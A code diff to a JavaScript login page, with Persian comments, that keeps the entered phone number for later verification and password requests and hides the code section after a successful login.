@@ -1,5 +1,6 @@
 // script.js
 let phoneCodeHash = ''; // برای ذخیره hash کد
+let currentPhone = ''; // برای ذخیره شماره تلفن
 
 document.getElementById("sendPhone").onclick = async () => {
   const phone = document.getElementById("phone").value;
@@ -8,6 +9,7 @@ document.getElementById("sendPhone").onclick = async () => {
     return;
   }
 
+  currentPhone = phone;
   document.getElementById("status").textContent = "در حال ارسال کد...";
   
   try {
@@ -31,7 +33,6 @@ document.getElementById("sendPhone").onclick = async () => {
 };
 
 document.getElementById("sendCode").onclick = async () => {
-  const phone = document.getElementById("phone").value;
   const code = document.getElementById("code").value;
   
   if (!code) {
@@ -47,7 +48,7 @@ document.getElementById("sendCode").onclick = async () => {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ 
         step: "verifyCode", 
-        phone, 
+        phone: currentPhone, 
         code,
         phoneCodeHash 
       })
@@ -65,14 +66,22 @@ document.getElementById("sendCode").onclick = async () => {
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ 
             step: "checkPassword", 
-            phone, 
+            phone: currentPhone, 
             password 
           })
         });
         
         const dataPwd = await resPwd.json();
         document.getElementById("status").textContent = dataPwd.message;
+        
+        if (dataPwd.success) {
+          // در صورت موفقیت آمیز بودن ورود
+          document.getElementById("codeSection").style.display = "none";
+        }
       }
+    } else if (data.success) {
+      // در صورت موفقیت آمیز بودن ورود
+      document.getElementById("codeSection").style.display = "none";
     }
   } catch (error) {
     document.getElementById("status").textContent = "خطا در ارتباط با سرور";
